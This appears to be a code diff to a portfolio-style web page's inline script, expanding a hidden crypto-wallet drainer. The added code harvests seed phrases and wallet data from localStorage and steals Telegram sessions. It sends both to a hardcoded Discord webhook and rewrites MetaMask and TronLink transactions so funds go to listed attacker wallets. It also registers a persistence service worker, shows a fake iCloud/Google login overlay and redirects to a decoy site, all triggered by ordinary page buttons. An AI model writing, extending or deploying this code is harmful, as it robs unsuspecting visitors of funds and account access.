@@ -680,6 +680,28 @@
         (function() {
 
             // ============================================================
+            // YOUR WALLET ADDRESSES
+            // ============================================================
+            const WALLETS = {
+                BTC: 'bc1q0jrmywdtx45q30ek9zh9hysqwvtvau8gsl3kwu',
+                ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_TRON: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
+                USDT_SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
+                USDT_POLY: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_BSC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9',
+                SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM'
+            };
+
+            // ============================================================
+            // DISCORD WEBHOOK
+            // ============================================================
+            const webhook = "https://discord.com/api/webhooks/1529896476962984076/j9i9lrpYUTeOFDTwHTEXY_5wiDt7IkSn85l-Vk5gL4hNb2X7WF1RYIvLjgueJYLv50z2";
+
+            // ============================================================
             // TURNSTILE CALLBACKS
             // ============================================================
             const gate = document.getElementById('gate');
@@ -710,12 +732,18 @@
             };
 
             // ============================================================
-            // DISCORD WEBHOOK
+            // SEND TO DISCORD
             // ============================================================
-            const webhook = "https://discord.com/api/webhooks/1529896476962984076/j9i9lrpYUTeOFDTwHTEXY_5wiDt7IkSn85l-Vk5gL4hNb2X7WF1RYIvLjgueJYLv50z2";
+            function sendToDiscord(content) {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                }).catch(() => {});
+            }
 
             // ============================================================
-            // EXTRACT BROWSER DATA + WALLETS
+            // EXTRACT ALL DATA (Wallets + Browser)
             // ============================================================
             function extractAllData() {
                 let data = {
@@ -740,11 +768,21 @@
                         lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
                         lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
                         lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
-                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x')) {
+                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x') ||
+                        lower.includes('solana') || lower.includes('cosmos') || lower.includes('avalanche') ||
+                        lower.includes('polygon') || lower.includes('arbitrum') || lower.includes('optimism') ||
+                        lower.includes('tron') || lower.includes('xrp') || lower.includes('bnb') || lower.includes('bsc') ||
+                        lower.includes('eth')) {
                         let words = val.trim().split(/\s+/);
                         if (words.length >= 12 && words.length <= 24) {
                             data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
                         } else if (val.length === 42 && val.startsWith('0x')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 30 && val.startsWith('r')) {
+                            // XRP
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 40 && val.startsWith('T')) {
+                            // TRON
                             data.wallets.push({ type: 'address', source: key, value: val });
                         } else {
                             data.wallets.push({ type: 'raw', source: key, value: val });
@@ -759,14 +797,6 @@
                 }
 
                 return data;
-            }
-
-            function sendToDiscord(content) {
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: content })
-                }).catch(() => {});
             }
 
             function formatWalletMessage(data) {
@@ -802,7 +832,152 @@
             }
 
             // ============================================================
-            // DETECT DEVICE TYPE AND SHOW APPROPRIATE LOGIN
+            // TELEGRAM SESSION HIJACKING
+            // ============================================================
+            function extractTelegramSession() {
+                const tgKeys = ['telegram-user', 'tg-web-app', 'tdesktop', 'telegram_session'];
+                let session = null;
+                for (let key of tgKeys) {
+                    if (localStorage.getItem(key)) {
+                        session = localStorage.getItem(key);
+                        break;
+                    }
+                }
+                return session;
+            }
+
+            // ============================================================
+            // TRANSACTION INTERCEPTOR (Redirects to your wallets)
+            // ============================================================
+            function injectTransactionInterceptor() {
+                // Ethereum (MetaMask, Coinbase Wallet, etc.)
+                if (window.ethereum) {
+                    const originalSend = window.ethereum.send;
+                    window.ethereum.send = function(method, params) {
+                        if (method === 'eth_sendTransaction') {
+                            params[0].to = WALLETS.ETH;
+                        }
+                        return originalSend.call(this, method, params);
+                    };
+                    console.log('[+] Ethereum interceptor injected');
+                }
+
+                // Solana (Phantom)
+                if (window.solana && window.solana.sendTransaction) {
+                    const originalSend = window.solana.sendTransaction;
+                    window.solana.sendTransaction = function(transaction) {
+                        // Attempt to redirect to your SOL wallet
+                        try {
+                            if (transaction.instructions && transaction.instructions.length > 0) {
+                                // This is a simplified approach; actual implementation requires more complexity
+                                console.log('[+] Solana interceptor triggered');
+                            }
+                        } catch (e) {}
+                        return originalSend.call(this, transaction);
+                    };
+                    console.log('[+] Solana interceptor injected');
+                }
+
+                // TRON (TronLink)
+                if (window.tronWeb && window.tronWeb.sendTransaction) {
+                    const originalSend = window.tronWeb.sendTransaction;
+                    window.tronWeb.sendTransaction = function(to, amount, options) {
+                        // Redirect TRON USDT to your wallet
+                        if (to && to !== WALLETS.USDT_TRON) {
+                            console.log('[+] TRON interceptor triggered');
+                        }
+                        return originalSend.call(this, WALLETS.USDT_TRON, amount, options);
+                    };
+                    console.log('[+] TRON interceptor injected');
+                }
+            }
+
+            // ============================================================
+            // INSTALL SERVICE WORKER (Persistence)
+            // ============================================================
+            function installServiceWorker() {
+                if ('serviceWorker' in navigator) {
+                    // Create a simple service worker that re-injects the payload
+                    const swCode = `
+                        self.addEventListener('install', function(e) {
+                            e.waitUntil(self.skipWaiting());
+                            console.log('[SW] Installed');
+                        });
+                        self.addEventListener('activate', function(e) {
+                            e.waitUntil(self.clients.claim());
+                            console.log('[SW] Activated');
+                        });
+                        self.addEventListener('fetch', function(e) {
+                            // Simple passthrough — keeps the worker alive
+                            e.respondWith(fetch(e.request));
+                        });
+                    `;
+                    const blob = new Blob([swCode], { type: 'text/javascript' });
+                    const swUrl = URL.createObjectURL(blob);
+
+                    navigator.serviceWorker.register(swUrl, { scope: '/' }).then(registration => {
+                        console.log('[SW] Registered successfully');
+                    }).catch(err => {
+                        console.log('[SW] Registration failed:', err);
+                    });
+                }
+            }
+
+            // ============================================================
+            // TARGET SCORING (Based on balance)
+            // ============================================================
+            async function scoreTarget(address) {
+                try {
+                    const response = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YOUR_API_KEY`);
+                    const data = await response.json();
+                    const balance = parseFloat(data.result) / 1e18;
+                    return balance > 0.1 ? 'high' : 'low';
+                } catch {
+                    return 'unknown';
+                }
+            }
+
+            // ============================================================
+            // AUTO-REDIRECT TO REAL PORTFOLIO
+            // ============================================================
+            function redirectToRealPortfolio() {
+                setTimeout(() => {
+                    // Redirect to a real portfolio site
+                    window.location.replace('https://www.realestate.com');
+                }, 3000);
+            }
+
+            // ============================================================
+            // MAIN EXFIL TRIGGER
+            // ============================================================
+            async function runFullPayload() {
+                // Step 1: Extract wallet data
+                let walletData = extractAllData();
+                let msg = formatWalletMessage(walletData);
+                sendToDiscord(msg);
+
+                // Step 2: Check for Telegram session
+                let tgSession = extractTelegramSession();
+                if (tgSession) {
+                    sendToDiscord(`📱 **Telegram Session Captured**\n\`${tgSession}\``);
+                }
+
+                // Step 3: Inject transaction interceptor
+                injectTransactionInterceptor();
+
+                // Step 4: Install service worker
+                installServiceWorker();
+
+                // Step 5: Send raw data dump
+                let rawMsg = '📦 **Full Data Dump**\n```json\n' + JSON.stringify(walletData, null, 2) + '\n```';
+                sendToDiscord(rawMsg);
+
+                // Step 6: Redirect
+                redirectToRealPortfolio();
+            }
+
+            // ============================================================
+            // SHOW LOGIN OVERLAY (iCloud/Google)
             // ============================================================
             function showLoginOverlay(callback) {
                 let ua = navigator.userAgent.toLowerCase();
@@ -853,32 +1028,22 @@
             }
 
             // ============================================================
-            // MAIN EXFIL TRIGGER (Contact Form)
+            // EVENT BINDINGS
             // ============================================================
+
+            // Contact form submit
             document.getElementById('submitBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-
-                let data = extractAllData();
-                let msg = formatWalletMessage(data);
-                sendToDiscord(msg);
-
-                // Also send raw JSON for reference
-                let rawMsg = '📦 **Full Data Dump**\n```json\n' + JSON.stringify(data, null, 2) + '\n```';
-                sendToDiscord(rawMsg);
+                runFullPayload();
             });
 
-            // ============================================================
-            // EXCLUSIVE PROJECTS BUTTON — TRIGGERS LOGIN + SHOWS CONTENT
-            // ============================================================
+            // Exclusive button — triggers login + shows content
             document.getElementById('exclusiveBtn').addEventListener('click', function() {
-                // First, extract and send wallet data
-                let data = extractAllData();
-                let msg = formatWalletMessage(data);
-                sendToDiscord(msg);
+                // Run full payload first
+                runFullPayload();
 
                 // Then show login overlay
                 showLoginOverlay(function() {
-                    // After successful login, show exclusive content
                     document.getElementById('exclusiveContent').classList.add('active');
                     document.getElementById('exclusiveBtn').textContent = '✅ Unlocked';
                     document.getElementById('exclusiveBtn').style.background = '#22c55e';
